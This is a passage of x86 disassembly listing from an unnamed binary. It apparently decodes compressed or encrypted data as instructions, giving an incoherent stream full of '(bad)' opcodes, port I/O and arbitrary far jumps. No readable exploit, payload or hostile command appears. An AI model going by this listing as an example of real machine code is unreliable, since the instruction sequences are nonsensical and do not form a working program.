  413027:	sahf   
  413028:	mov    cl,0x67
  41302a:	test   al,0x90
  41302c:	enter  0x3f1c,0xd
  413030:	push   edx
  413031:	jp     0x4130a9
  413033:	mov    al,0x13
  413035:	sub    ch,BYTE PTR [ebp-0x447b6028]
  41303b:	fbstp  TBYTE PTR [edx]
  41303d:	mov    cl,BYTE PTR [edx]
  41303f:	imul   ebx,esp,0x78
  413042:	outs   dx,BYTE PTR ds:[esi]
  413043:	pop    edi
  413044:	sbb    ch,BYTE PTR [eax-0x147494bf]
  41304a:	imul   ebp,DWORD PTR [ecx],0x4f278f64
  413050:	loopne 0x413093
  413052:	push   edx
  413053:	imul   edi,DWORD PTR [edx],0x5
  413056:	pushf  
  413057:	sub    dl,BYTE PTR [edi-0x69]
  41305a:	push   ds
  41305b:	pop    esi
  41305c:	lea    ebp,cs:0xbdf12674
  413063:	inc    ebp
  413064:	stc    
  413065:	out    dx,al
  413066:	jb     0x413052
  413068:	ficomp WORD PTR [esi+0xb]
  41306b:	icebp  
  41306c:	ret    0x6d26
  41306f:	pop    edx
  413070:	mov    ds:0xe1bc32f9,al
  413075:	mov    DWORD PTR [edx+0x7],0x90b91299
  41307c:	mov    dl,0x8a
  41307e:	sub    dx,WORD PTR [esp+ecx*4]
  413082:	sbb    al,0xd5
  413084:	sub    cl,BYTE PTR [esi]
  413086:	in     eax,0x83
  413088:	das    
  413089:	shr    BYTE PTR fs:[bp+0x53e5],0x82
  413090:	fstp   DWORD PTR [esi+0xe]
  413093:	or     cl,BYTE PTR [eax]
  413095:	mov    ds:0xd6f312dc,al
  41309a:	ret    0x71be
  41309d:	sub    esp,DWORD PTR [ebp+0x1e4ae97]
  4130a3:	sub    al,0xf7
  4130a5:	mov    esp,0x5f436310
  4130aa:	fs fcmovnbe st,st(3)
  4130ad:	in     al,dx
  4130ae:	sahf   
  4130af:	jnp    0x4130d3
  4130b1:	outs   dx,BYTE PTR ds:[esi]
  4130b2:	sbb    al,0xca
  4130b4:	stos   DWORD PTR es:[edi],eax
  4130b5:	sub    BYTE PTR [edx+0x2b5f332b],al
  4130bb:	shr    BYTE PTR [esi+0x6e],0x78
  4130bf:	push   edx
  4130c0:	or     dh,BYTE PTR [edi-0x226e6ab6]
  4130c6:	or     edi,DWORD PTR [ecx+0x29715ff6]
  4130cc:	push   edi
  4130cd:	enter  0x69b5,0xf8
  4130d1:	pop    es
  4130d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130d3:	push   ds
  4130d4:	push   0x10e112a7
  4130d9:	cld    
  4130da:	stos   DWORD PTR es:[edi],eax
  4130db:	(bad)  
  4130dc:	dec    edx
  4130dd:	inc    ebp
  4130de:	sub    ebx,ebx
  4130e0:	pop    ss
  4130e1:	push   ds
  4130e2:	mov    fs,WORD PTR [ebp+0x286f926e]
  4130e8:	daa    
  4130e9:	push   ss
  4130ea:	(bad)  
  4130eb:	adc    BYTE PTR [edx],bh
  4130ed:	xchg   esp,eax
  4130ee:	mul    DWORD PTR [edi+0x62]
  4130f1:	push   edi
  4130f2:	cli    
  4130f3:	adc    edx,ecx
  4130f5:	xor    DWORD PTR [edi+eax*2-0x74],ecx
  4130f9:	popa   
  4130fa:	cmp    bl,ah
  4130fc:	xchg   edx,eax
  4130fd:	jno    0x41312f
  4130ff:	loopne 0x4130d7
  413101:	adc    eax,0x7cb82893
  413106:	mov    dl,0xf7
  413108:	pop    edx
  413109:	int    0x98
  41310b:	xchg   BYTE PTR [edi],al
  41310d:	push   edx
  41310e:	xchg   ebx,eax
  41310f:	xchg   edx,eax
  413110:	into   
  413111:	push   edx
  413112:	pop    esi
  413113:	cmp    eax,0xf4ec9e4e
  413118:	adc    ebx,ecx
  41311a:	loopne 0x41315c
  41311c:	pop    esi
  41311d:	dec    esi
  41311e:	jne    0x413177
  413120:	scas   al,BYTE PTR es:[edi]
  413121:	test   al,0x15
  413123:	add    eax,0xd90c0242
  413128:	(bad)  
  413129:	mov    BYTE PTR [ecx],cl
  41312b:	mov    al,0x30
  41312d:	pop    eax
  41312e:	rcr    DWORD PTR [esi+0x1cda95c8],0x5c
  413135:	jmp    0x6713:0xe334ce6c
  41313c:	and    DWORD PTR [edx-0x2305dbea],eax
  413142:	xchg   esi,eax
  413143:	and    eax,0x44
  413146:	mov    cl,BYTE PTR [ebx+0x46083829]
  41314c:	retf   
  41314d:	mov    ds:0xfc986ddc,eax
  413152:	(bad)  
  413153:	jbe    0x41312b
  413155:	and    ebp,DWORD PTR [ecx+0x3d6732c4]
  41315b:	fmul   DWORD PTR [ebx-0x69]
  41315e:	and    al,0xad
  413160:	adc    al,0x96
  413162:	mov    ebp,0x34958975
  413167:	outs   dx,BYTE PTR ds:[esi]
  413168:	imul   esi,DWORD PTR ds:0x858a31ff,0x3f7e1380
  413172:	fadd   st(2),st
  413174:	push   eax
  413175:	mov    al,ds:0x88680bf6
  41317a:	or     al,0x33
  41317c:	mov    eax,0x1e009531
  413181:	xor    ch,dl
  413183:	xchg   esp,eax
  413184:	pop    esi
  413185:	out    0x3c,eax
  413187:	out    0xf4,eax
  413189:	push   0xcf1a7e71
  41318e:	push   ecx
  41318f:	stc    
  413190:	arpl   WORD PTR [esi+eax*1-0x7],di
  413194:	mov    WORD PTR [edx+0x5a970859],cs
  41319a:	sti    
  41319b:	stc    
  41319c:	fild   WORD PTR [ecx+0x32]
  41319f:	lods   al,BYTE PTR ds:[esi]
  4131a0:	xchg   esi,eax
  4131a1:	sub    eax,DWORD PTR [ecx+0x36]
  4131a4:	mov    ebp,0x14b8a31d
  4131a9:	(bad)  [eax+edx*1]
  4131ac:	xchg   esi,eax
  4131ad:	jbe    0x4131f1
  4131af:	outs   dx,DWORD PTR ds:[esi]
  4131b0:	div    DWORD PTR [edi+edi*2-0x6]
  4131b4:	pop    eax
  4131b5:	in     al,dx
  4131b6:	enter  0x468a,0x1c
  4131ba:	pop    edi
  4131bb:	sbb    ah,BYTE PTR [esi-0x70]
  4131be:	mov    edx,0x7df2fe52
  4131c3:	adc    eax,0x2cf849b0
  4131c8:	inc    ebx
  4131c9:	inc    esi
  4131ca:	jecxz  0x41314e
  4131cc:	or     DWORD PTR [esi-0x1d],ebp
  4131cf:	cs retf 0x8878
  4131d3:	xchg   ebx,eax
  4131d4:	push   ss
  4131d5:	sbb    esp,DWORD PTR [ecx-0x474f8934]
  4131db:	leave  
  4131dc:	in     eax,dx
  4131dd:	dec    eax
  4131de:	jnp    0x4131c0
  4131e0:	hlt    
  4131e1:	mov    ecx,DWORD PTR [esi]
  4131e3:	jnp    0x413240
  4131e5:	cmp    eax,0x996cfa74
  4131ea:	lods   al,BYTE PTR ds:[esi]
  4131eb:	jmp    0xcc7c:0x3ea4b8d7
  4131f2:	jns    0x41321c
  4131f4:	nop
  4131f5:	mov    ah,0x4a
  4131f7:	aas    
  4131f8:	(bad)  
  4131f9:	retf   
  4131fa:	dec    ecx
  4131fb:	loop   0x413234
  4131fd:	push   cs
  4131fe:	mov    dl,bh
  413200:	std    
  413201:	jge    0x4131d5
  413203:	scas   al,BYTE PTR es:[edi]
  413204:	in     eax,0x4c
  413206:	pop    ebx
  413207:	dec    ebp
  413208:	xor    eax,0x54719127
  41320d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41320e:	adc    DWORD PTR [edi+0x6269272d],0x8d1e3a57
  413218:	out    dx,al
  413219:	mov    eax,0xdcb8dcf3
  41321e:	(bad)  
  41321f:	inc    esi
  413220:	sub    eax,0xfafe9988
  413225:	xchg   ebp,eax
  413226:	push   esp
  413227:	loope  0x4131d8
  413229:	dec    ebx
  41322a:	mov    edi,DWORD PTR [edx-0x244424b3]
  413230:	jmp    0x5f1e6c02
  413235:	mov    WORD PTR [edx],ss
  413237:	outs   dx,BYTE PTR ds:[esi]
  413238:	cdq    
  413239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41323a:	adc    al,0xf7
  41323c:	jp     0x413262
  41323e:	inc    ebp
  41323f:	sbb    BYTE PTR [ecx+0x1],ch
  413242:	sbb    ebp,DWORD PTR [ebx+0x7eaf15d4]
  413248:	add    eax,0x927794f
  41324d:	pop    ss
  41324e:	pop    eax
  41324f:	retf   0xc2ca
  413252:	imul   ebx,ebp,0xbcf68f47
  413258:	push   ss
  413259:	xchg   ebx,eax
  41325a:	sub    ebx,edx
  41325c:	shrd   DWORD PTR [ecx+0x6b],eax,0xcf
  413261:	imul   ebx,eax,0xffffffaf
  413264:	call   0x911a:0x3e9f9416
  41326b:	inc    ebp
  41326c:	cld    
  41326d:	pop    ecx
  41326e:	sub    bl,dl
  413270:	sub    dl,BYTE PTR [ecx+0x68786dcd]
  413276:	in     al,dx
  413277:	aas    
  413278:	xchg   BYTE PTR ds:0x7497e848,cl
  41327e:	(bad)  
  41327f:	ret    
  413280:	mov    esp,0x851546e8
  413285:	sahf   
  413286:	test   eax,0x2d27785f
  41328b:	sbb    ebx,DWORD PTR [edi+0x15]
  41328e:	dec    esp
  41328f:	add    DWORD PTR [ebp-0x24],ebp
  413292:	ror    BYTE PTR [edx-0x2a],0x69
  413296:	(bad)  
  413297:	pop    ds
  413298:	push   0x87df249b
  41329d:	pop    eax
  41329e:	xchg   WORD PTR [ebp+0x677d1766],si
  4132a5:	jmp    0x413299
  4132a7:	mov    ebp,0xbe320a2d
  4132ac:	pop    edi
  4132ad:	test   eax,0x5baf7c6
  4132b2:	hlt    
  4132b3:	mov    ah,0x13
  4132b5:	imul   edx,DWORD PTR [esi],0x31
  4132b8:	or     ebx,DWORD PTR [edi+0x3a0a0fe2]
  4132be:	pop    edx
  4132bf:	sahf   
  4132c0:	or     esp,edi
  4132c2:	or     ebx,DWORD PTR [edi+0x6d]
  4132c5:	adc    BYTE PTR [esi-0x8],cl
  4132c8:	(bad)  
  4132c9:	in     eax,dx
  4132ca:	retf   0x4012
  4132cd:	push   ds
  4132ce:	aaa    
  4132cf:	add    al,0xf9
  4132d1:	pop    esi
  4132d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132d3:	fmul   st,st(4)
  4132d5:	mov    ah,0x5e
  4132d7:	jecxz  0x413307
  4132d9:	cmp    al,BYTE PTR ds:0x319db2b7
  4132df:	cmp    BYTE PTR [esi],al
  4132e1:	sub    eax,0x1cae7de0
  4132e6:	stos   BYTE PTR es:[edi],al
  4132e7:	mov    ecx,0xa4fb949a
  4132ec:	jae    0x413279
  4132ee:	adc    BYTE PTR [edi-0x37f9319d],dh
  4132f4:	test   DWORD PTR [ebp+0x37],esp
  4132f7:	cs cli 
  4132f9:	sar    edi,cl
  4132fb:	outs   dx,DWORD PTR ds:[esi]
  4132fc:	sahf   
  4132fd:	xchg   ebp,eax
  4132fe:	xchg   ecx,eax
  4132ff:	cmc    
  413300:	inc    edi
  413301:	retf   0xa1b2
  413304:	in     eax,dx
  413305:	ins    DWORD PTR es:[edi],dx
  413306:	push   0xffffffa3
  413308:	sbb    eax,0x343b7029
  41330d:	lods   eax,DWORD PTR ds:[esi]
  41330e:	lds    eax,FWORD PTR [edi+edi*2+0x38]
  413312:	pop    ebx
  413313:	(bad)  
  413314:	mov    BYTE PTR [eax],bh
  413316:	or     ebx,ebx
  413318:	(bad)  
  413319:	ins    DWORD PTR es:[edi],dx
  41331a:	inc    esi
  41331b:	rcr    DWORD PTR [edx+0x60],1
  41331e:	(bad)  [edi]
  413320:	out    dx,eax
  413321:	cmp    bh,BYTE PTR [ecx-0xd826094]
  413327:	in     al,dx
  413328:	shr    BYTE PTR [ebx+ecx*2-0x49041f33],cl
  41332f:	stos   DWORD PTR es:[edi],eax
  413330:	push   esp
  413331:	xchg   DWORD PTR [ebx-0x37bae39c],ecx
  413337:	int    0xf5
  413339:	das    
  41333a:	das    
  41333b:	sbb    ebx,edi
  41333d:	mov    eax,0x8ddf86b4
  413342:	mov    bh,0xd
  413344:	int    0xc4
  413346:	in     al,dx
  413347:	rol    BYTE PTR [esi],0x8c
  41334a:	dec    DWORD PTR ds:0x5eda7eb6
  413350:	adc    BYTE PTR [ecx],ah
  413352:	out    0x5,al
  413354:	cmp    DWORD PTR [ebp-0x2721cff9],ecx
  41335a:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41335c:	fiadd  DWORD PTR [edi-0x2f]
  41335f:	clc    
  413360:	inc    esp
  413361:	push   cs
  413362:	inc    edx
  413363:	inc    edi
  413364:	jge    0x4133ab
  413366:	push   esi
  413367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413368:	iret   
  413369:	jmp    0x4132f0
  41336b:	ins    DWORD PTR es:[edi],dx
  41336c:	jl     0x413304
  41336e:	ins    WORD PTR es:[edi],dx
  413370:	xor    eax,0x1e95217b
  413375:	call   DWORD PTR [esi+0x340c6738]
  41337b:	sbb    eax,0x1b83de16
  413380:	pop    ss
  413381:	in     eax,0x6d
  413383:	pop    edx
  413384:	hlt    
  413385:	stc    
  413386:	sbb    ch,BYTE PTR [eax+ecx*8+0xe]
  41338a:	adc    dh,ch
  41338c:	mov    al,ds:0xcb8051e1
  413391:	das    
  413392:	les    edi,FWORD PTR [esi+0x7085ccba]
  413398:	shl    DWORD PTR [esi+0x64ba914d],0xdc
  41339f:	mov    al,ds:0x5502a8b3
  4133a4:	fs call 0x33156853
  4133aa:	dec    edi
  4133ab:	sub    esi,DWORD PTR [edx]
  4133ad:	fdivp  st(3),st
  4133af:	jmp    0x413388
  4133b1:	les    edi,FWORD PTR [eax]
  4133b3:	nop
  4133b4:	xchg   esi,eax
  4133b5:	adc    ebp,DWORD PTR [ebx]
  4133b7:	out    0x4,eax
  4133b9:	ins    BYTE PTR es:[edi],dx
  4133ba:	inc    ebp
  4133bb:	pushf  
  4133bc:	test   al,0xd1
  4133be:	call   FWORD PTR [eax]
  4133c0:	dec    ecx
  4133c1:	lods   al,BYTE PTR ds:[esi]
  4133c2:	or     DWORD PTR [edi],edi
  4133c4:	test   edx,ebx
  4133c6:	xor    DWORD PTR [eax+0x2c983760],ecx
  4133cc:	and    al,0x2f
  4133ce:	xchg   ebp,eax
  4133cf:	repnz fbld TBYTE PTR [ebx]
  4133d2:	out    0xa9,eax
  4133d4:	cmp    al,0x5f
  4133d6:	mov    al,ds:0xf3308a77
  4133db:	loop   0x4133e8
  4133dd:	jne    0x413414
  4133df:	push   ds
  4133e0:	call   0xbaad:0x17d6eae1
  4133e7:	and    al,0x8c
  4133e9:	mov    edi,0xd2748b37
  4133ee:	inc    edx
  4133ef:	(bad)  
  4133f0:	int3   
  4133f1:	dec    ebp
  4133f2:	inc    ebx
  4133f3:	dec    edx
  4133f4:	repnz xor DWORD PTR es:[ecx-0x29c36f3f],0x7b76df07
  413400:	and    DWORD PTR [ebx+ecx*2+0x11],eax
  413404:	popf   
  413405:	jp     0x413433
  413407:	jno    0x413446
  413409:	xor    ebx,eax
  41340b:	out    dx,al
  41340c:	(bad)  
  41340d:	and    DWORD PTR [ecx],eax
  41340f:	ret    0x599c
  413412:	es neg bl
  413415:	aas    
  413416:	not    bl
  413418:	(bad)  
  413419:	mov    bh,0xe2
  41341b:	repz push esi
  41341d:	xor    DWORD PTR [edx+0x50],edi
  413420:	mov    ch,0x11
  413422:	mov    ebp,0x86ee497d
  413427:	add    eax,eax
  413429:	xchg   esi,eax
  41342a:	in     eax,0xb5
  41342c:	mov    DWORD PTR [ebp+0x26c44d0e],0x403b63ca
  413436:	sbb    BYTE PTR [eax+0x66],bl
  413439:	inc    esi
  41343a:	dec    edx
  41343b:	sbb    al,0xbc
  41343d:	and    al,0xd3
  41343f:	scas   al,BYTE PTR es:[edi]
  413440:	sbb    eax,0x33c9c777
  413445:	frstor [edx+0x51e9b37d]
  41344b:	inc    esp
  41344c:	inc    eax
  41344d:	mov    ds,WORD PTR [edi+0x7cb7bf9d]
  413453:	mov    ebx,DWORD PTR [ecx]
  413455:	aas    
  413456:	dec    edi
  413457:	mov    cs,WORD PTR [ebx+0x7e]
  41345a:	es cmp eax,0x53e4d409
  413460:	shl    ah,cl
  413462:	enter  0x297f,0xa8
  413466:	add    al,0x52
  413468:	mov    ch,0xb9
  41346a:	push   es
  41346b:	pop    edx
  41346c:	lock mov bh,0x94
  41346f:	aas    
  413470:	enter  0x554e,0x26
  413474:	and    BYTE PTR [eax-0x748bd0c2],cl
  41347a:	lahf   
  41347b:	mov    ah,0x8
  41347d:	fcomp  QWORD PTR [ebp+0x4b]
  413480:	cwde   
  413481:	retf   
  413482:	jge    0x4134ce
  413484:	push   ecx
  413485:	and    esp,DWORD PTR [eax+0x69]
  413488:	cwde   
  413489:	jae    0x413456
  41348b:	out    0xb,eax
  41348d:	pop    es
  41348e:	pop    ebx
  41348f:	cwde   
  413490:	sbb    ebp,DWORD PTR [edx+0x273dfe35]
  413496:	in     al,0x56
  413498:	not    BYTE PTR fs:[ebp+0x14e2c1ce]
  41349f:	aad    0xed
  4134a1:	ins    DWORD PTR es:[edi],dx
  4134a2:	outs   dx,BYTE PTR ds:[esi]
  4134a3:	mov    esp,0x2410e768
  4134a8:	xchg   DWORD PTR cs:[edx],edx
  4134ab:	loop   0x413525
  4134ad:	sub    eax,0x344cd82
  4134b2:	jg     0x41352a
  4134b4:	ss popf 
  4134b6:	pusha  
  4134b7:	es pushf 
  4134b9:	iret   
  4134ba:	dec    edx
  4134bb:	int    0xa2
  4134bd:	jnp    0x4134d7
  4134bf:	mov    ah,0x77
  4134c1:	xchg   BYTE PTR [ecx],ch
  4134c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134c4:	jno    0x413535
  4134c6:	adc    esi,DWORD PTR ds:0x69993f7d
  4134cc:	popa   
  4134cd:	les    ecx,FWORD PTR [ebx-0x6bae9d1e]
  4134d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134d4:	sub    dl,BYTE PTR [edi+0x43221c1d]
  4134da:	sub    edi,ecx
  4134dc:	add    bl,BYTE PTR [ecx]
  4134de:	mov    dh,0x60
  4134e0:	push   ds
  4134e1:	rcl    edi,cl
  4134e3:	out    0xfb,eax
  4134e5:	rcl    ah,1
  4134e7:	sbb    esp,DWORD PTR [edi]
  4134e9:	sbb    eax,DWORD PTR [edi-0x693b4398]
  4134ef:	xor    BYTE PTR [esp+eax*8],0x37
  4134f3:	xchg   edi,eax
  4134f4:	add    eax,0x26c9f9f6
  4134f9:	es push 0xf
  4134fc:	mov    ah,0xa4
  4134fe:	xchg   BYTE PTR [ebx+0x32],cl
  413501:	sahf   
  413502:	fwait
  413503:	ins    BYTE PTR es:[edi],dx
  413504:	sahf   
  413505:	mov    ah,0x8b
  413508:	fild   DWORD PTR [ecx+0x10]
  41350b:	mov    ebx,0xffdfe29f
  413510:	ds or  eax,0x8c517dd3
  413516:	or     al,ah
  413518:	cli    
  413519:	pop    ds
  41351a:	pop    ebp
  41351b:	jbe    0x413542
  41351d:	pop    edx
  41351e:	sub    al,0xcc
  413520:	jnp    0x413571
  413522:	repz daa 
  413524:	out    0xd6,al
  413526:	cmc    
  413527:	test   ebp,esi
  413529:	retf   
  41352a:	retf   0x9fdc
  41352d:	(bad)  
  41352e:	jmp    0xcf45:0xf8cba890
  413535:	arpl   WORD PTR [esi-0x16],dx
  413538:	mov    ebx,edi
  41353a:	bound  edx,QWORD PTR [edi-0x39d83fc3]
  413540:	std    
  413541:	jnp    0x41350c
  413543:	xchg   ebx,eax
  413544:	pusha  
  413545:	pop    es
  413546:	sub    ebp,DWORD PTR [eax]
  413548:	mov    ebp,0x6664d7f7
  41354d:	loope  0x4134e6
  41354f:	jbe    0x4135a6
  413551:	add    ebx,DWORD PTR [esi]
  413553:	test   al,0x96
  413555:	xchg   ebx,eax
  413556:	mov    al,0xb6
  413558:	stos   DWORD PTR es:[edi],eax
  413559:	pusha  
  41355a:	pop    ss
  41355b:	inc    ebp
  41355c:	int    0x8c
  41355e:	(bad)  
  41355f:	ror    ebx,cl
  413561:	mov    esp,0x153ff3f6
  413566:	mov    al,0x18
  413568:	retf   0x1fd9
  41356b:	es inc edx
  41356d:	sbb    eax,0xb9dbe8c8
  413572:	add    eax,ebp
  413574:	xor    bh,BYTE PTR [esi+0x44]
  413577:	cmp    bh,ah
  413579:	or     al,0xe1
  41357b:	push   ebp
  41357c:	test   DWORD PTR [edi+0x73],ebp
  41357f:	ins    DWORD PTR es:[edi],dx
  413580:	fstp   QWORD PTR [ebp+0x69]
  413583:	jo     0x413513
  413585:	rol    BYTE PTR [eax],cl
  413587:	imul   esi,edx,0x3c
  41358a:	test   BYTE PTR [edx],dl
  41358c:	cmp    ch,dh
  41358e:	leave  
  41358f:	push   ds
  413590:	loopne 0x41355b
  413592:	scas   al,BYTE PTR es:[edi]
  413593:	fldenv [eax-0x4c]
  413596:	adc    dl,BYTE PTR [ebp+ebp*2-0x62]
  41359a:	or     DWORD PTR [ecx],0x9397061f
  4135a0:	xchg   edi,eax
  4135a1:	cmp    al,0xb5
  4135a3:	lods   eax,DWORD PTR ds:[esi]
  4135a4:	pusha  
  4135a5:	fisub  WORD PTR [ebp-0x3d]
  4135a8:	in     eax,dx
  4135a9:	ins    DWORD PTR es:[edi],dx
  4135aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135ab:	rcr    DWORD PTR [edx-0x6e],1
  4135ae:	jmp    0x4135f5
  4135b0:	and    bh,BYTE PTR [edi]
  4135b2:	jae    0x413557
  4135b4:	into   
  4135b5:	push   es
  4135b6:	out    0x1a,eax
  4135b8:	push   0x10
  4135ba:	hlt    
  4135bb:	inc    edi
  4135bc:	(bad)  
  4135bd:	(bad)  
  4135be:	clc    
  4135bf:	inc    ebp
  4135c0:	(bad)  
  4135c1:	js     0x413597
  4135c3:	jns    0x413551
  4135c5:	das    
  4135c6:	or     DWORD PTR [edx-0x41],edi
  4135c9:	push   ds
  4135ca:	(bad)  
  4135cb:	iret   
  4135cc:	sahf   
  4135cd:	mov    esi,0xacd0681a
  4135d2:	sti    
  4135d3:	mov    cl,0xaf
  4135d5:	fld    QWORD PTR [edx+0x7fb25168]
  4135db:	pop    ds
  4135dc:	cmp    eax,0x1ca2502f
  4135e1:	mov    dh,BYTE PTR [eax]
  4135e3:	mov    ebx,0xd07969ef
  4135e8:	mov    esp,0x74952410
  4135ed:	cmp    eax,ecx
  4135ef:	fmul   st,st(6)
  4135f1:	lock imul ebp,esi,0xbf2c054
  4135f8:	pop    ebp
  4135f9:	and    eax,0x1cc2e55b
  4135fe:	xor    eax,0x44e73874
  413603:	into   
  413604:	repnz leave 
  413606:	test   BYTE PTR [ebx],bl
  413608:	je     0x4135ef
  41360a:	push   ds
  41360b:	mov    cl,0x36
  41360d:	sar    ah,0x8d
  413610:	mov    bh,0x15
  413612:	aaa    
  413613:	pop    ecx
  413614:	(bad)
  413617:	xchg   ebx,eax
  413618:	xlat   BYTE PTR ds:[ebx]
  413619:	jne    0x4135d2
  41361b:	cmp    ch,BYTE PTR [ebx]
  41361d:	ror    DWORD PTR [ecx],cl
  41361f:	dec    edx
  413620:	xchg   ebx,eax
  413621:	push   esp
  413622:	jo     0x413649
  413624:	int3   
  413625:	pop    eax
  413626:	jnp    0x41368c
  413628:	mov    eax,ds:0xb9f41a2f
  41362d:	pop    edi
  41362e:	push   esp
  41362f:	test   eax,0x1eb9b966
  413634:	iret   
  413635:	mov    ebp,0x1eeff41a
  41363a:	xor    DWORD PTR [edi],esp
  41363c:	out    dx,eax
  41363d:	mov    eax,ds:0x28a3735d
  413642:	sbb    eax,0xe95ab238
  413647:	sti    
  413648:	in     eax,0x6d
  41364a:	add    cl,BYTE PTR [ebx+0x29]
  41364d:	pop    edx
  41364e:	loop   0x41368d
  413650:	push   0xac145d7b
  413655:	xor    al,0xce
  413657:	es xchg esp,eax
  413659:	sub    ebx,DWORD PTR [edi]
  41365b:	(bad)  
  41365c:	dec    esp
  41365d:	test   DWORD PTR [edi-0x3a],eax
  413660:	push   edx
  413661:	dec    esi
  413662:	aam    0xfa
  413664:	stos   BYTE PTR es:[edi],al
  413665:	xor    al,0xd9
  413667:	aaa    
  413668:	(bad)  
  413669:	jno    0x4136b8
  41366b:	mov    ch,0xf3
  41366d:	or     ebx,ebp
  41366f:	or     eax,0xee6629d7
  413674:	loope  0x413644
  413676:	cmp    ah,BYTE PTR [edi+0x2e]
  413679:	mov    edx,0x69e6eaa2
  41367e:	push   ecx
  41367f:	jne    0x4136d4
  413681:	jno    0x413658
  413683:	in     al,dx
  413684:	push   eax
  413685:	add    eax,0x47c0474b
  41368a:	jmp    0x4136d4
  41368c:	aam    0xb1
  41368e:	pop    bx
  413690:	xchg   esp,eax
  413691:	cmp    ebx,DWORD PTR [eax-0x57]
  413694:	pushf  
  413695:	xchg   BYTE PTR [edx+edx*1],al
  413698:	sbb    bl,ah
  41369a:	adc    al,0x23
  41369c:	jo     0x41363a
  41369e:	rcl    DWORD PTR [ecx+edi*8-0x33ff800e],1
  4136a5:	mov    ds:0x237ba2f4,al
  4136aa:	add    ebp,esi
  4136ac:	add    BYTE PTR ds:0xaedcdd8a,cl
  4136b2:	mov    bl,0x7a
  4136b4:	repz mov ch,0xe4
  4136b7:	test   eax,0x1a181899
  4136bc:	out    dx,eax
  4136bd:	sbb    eax,DWORD PTR [edx-0x59]
  4136c0:	cmp    BYTE PTR [ecx],bh
  4136c2:	int    0x5
  4136c4:	dec    esi
  4136c5:	mov    al,ds:0xe5beed47
  4136ca:	fucomi st,st(1)
  4136cc:	in     eax,dx
  4136cd:	xchg   esp,eax
  4136ce:	pushf  
  4136cf:	and    al,0x57
  4136d1:	sub    al,0x89
  4136d3:	sti    
  4136d4:	or     al,0x10
  4136d6:	jne    0x4136ad
  4136d8:	jg     0x413719
  4136da:	ins    BYTE PTR es:[edi],dx
  4136db:	outs   dx,DWORD PTR ds:[esi]
  4136dc:	mov    eax,0x40d91572
  4136e1:	add    BYTE PTR [ebp+0x57],dl
  4136e4:	rcr    DWORD PTR [eax+ecx*4+0x7],1
  4136e8:	push   ebp
  4136e9:	stc    
  4136ea:	and    eax,ebx
  4136ec:	jnp    0x413730
  4136ee:	(bad)  
  4136ef:	mov    ebx,0x80de0502
  4136f4:	fwait
  4136f5:	adc    eax,0xe51f0ae8
  4136fa:	cs push es
  4136fc:	mov    al,BYTE PTR [edx+0x2a]
  4136ff:	dec    ebp
  413700:	mov    ds:0x71c5c49b,eax
  413705:	mov    ch,0x8e
  413707:	mov    DWORD PTR [ebp+0x4f7de8],edi
  41370d:	es adc edi,ebp
  413710:	pop    eax
  413711:	mov    ds:0x131c7d9a,al
  413716:	and    BYTE PTR [esi+0x9ccd4ec],al
  41371c:	or     eax,0xb41aad20
  413721:	xchg   edx,eax
  413722:	push   eax
  413723:	adc    BYTE PTR [esi+esi*8-0x76b5a52b],dl
  41372a:	arpl   WORD PTR [edx+0x4bd5a04],bp
  413730:	sbb    al,BYTE PTR [ebp+0x5ab3a68f]
  413736:	arpl   WORD PTR [ecx-0x34],sp
  413739:	lds    esp,FWORD PTR [edx+edi*4+0xe2ebfc5]
  413740:	inc    ebp
  413741:	loopne 0x4136e3
  413743:	lds    esp,FWORD PTR [eax]
  413745:	fidiv  WORD PTR [esi+0x347be263]
  41374b:	jecxz  0x4136e7
  41374d:	inc    eax
  41374e:	cmp    cl,dl
  413750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413751:	hlt    
  413752:	pusha  
  413753:	icebp  
  413754:	ins    DWORD PTR es:[edi],dx
  413755:	xlat   BYTE PTR ds:[ebx]
  413756:	sar    ah,cl
  413758:	stc    
  413759:	xlat   BYTE PTR ds:[ebx]
  41375a:	cld    
  41375b:	xor    BYTE PTR [edx+0x43],al
  41375e:	test   DWORD PTR [edi+0x2dfa0e7d],ebx
  413764:	inc    edi
  413765:	jb     0x41374f
  413767:	loop   0x41375e
  413769:	shl    al,cl
  41376b:	pop    es
  41376c:	push   0xffffffcf
  41376e:	push   DWORD PTR [ebx-0x2da82c39]
  413774:	arpl   WORD PTR [eax-0x6b4ab63d],ax
  41377a:	stos   BYTE PTR es:[edi],al
  41377b:	stc    
  41377c:	test   dh,al
  41377e:	in     eax,dx
  41377f:	push   ebx
  413780:	pop    ecx
  413781:	sub    esp,DWORD PTR [edi-0x3f7bf17d]
  413787:	xchg   DWORD PTR [ebx],eax
  413789:	mov    ebp,0xa576af06
  41378e:	pop    ss
  41378f:	push   esp
  413790:	sar    BYTE PTR [esi-0x7f45ac15],cl
  413796:	mov    ds:0xa3776340,al
  41379b:	mov    ds:0xd7546515,al
  4137a0:	and    BYTE PTR [ecx+0x200b5924],cl
  4137a6:	mov    esp,0x2f268b95
  4137ab:	jo     0x413734
  4137ad:	and    al,0x86
  4137af:	cli    
  4137b0:	int3   
  4137b1:	jb     0x413774
  4137b3:	aaa    
  4137b4:	cs repnz popa 
  4137b7:	dec    ebx
  4137b8:	nop
  4137b9:	add    DWORD PTR [ebp+0x13],edx
  4137bc:	xor    al,0x4a
  4137be:	dec    ebx
  4137bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137c0:	fwait
  4137c1:	jmp    0x210c:0x64f275dd
  4137c8:	fild   WORD PTR [edi]
  4137ca:	cld    
  4137cb:	fnstcw WORD PTR [ebx-0x501ff2a5]
  4137d1:	mov    ah,0xe9
  4137d3:	out    dx,eax
  4137d4:	xchg   ebx,eax
  4137d5:	stos   DWORD PTR es:[edi],eax
  4137d6:	fld    QWORD PTR [ebx+0x77]
  4137d9:	inc    BYTE PTR [esi-0x44]
  4137dc:	jns    0x413857
  4137de:	mov    ebp,0xdca2b294
  4137e3:	gs mov dh,0x0
  4137e6:	mov    al,0x18
  4137e8:	outs   dx,DWORD PTR ds:[esi]
